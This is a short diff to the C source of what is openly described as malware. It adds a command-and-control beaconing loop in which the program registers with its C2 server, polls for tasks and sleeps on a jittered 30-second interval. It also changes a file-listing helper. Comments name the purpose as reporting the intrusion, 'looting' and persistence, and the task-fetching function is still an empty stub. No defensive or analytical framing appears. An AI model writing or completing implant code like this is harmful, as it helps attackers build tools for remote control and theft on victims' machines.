@@ -94,7 +94,7 @@ wchar_t* OSVersion(){
 }
 
 // List files in directory
-void ls(char* path){
+void ls(wchar_t* path){
     // Open context
     DIR *d;
     d = opendir(path);
@@ -184,11 +184,22 @@ void RegisterC2(){
     WinHttpCloseHandle(session);
 }
 
+wchar_t* GetTasks(){
+
+}
+
 int _tmain(int argc, _TCHAR *argv[]){
 
     if(argc == 1){
         // Report intrusion to C2
         RegisterC2();
+
+        while(1){
+            wchar_t* tasks = GetTasks();
+            
+            int jitter = (rand() % 20) - 10;
+            sleep(30+jitter);
+        }
     }
 
     // Do malware things (investigation, looting, persistence)
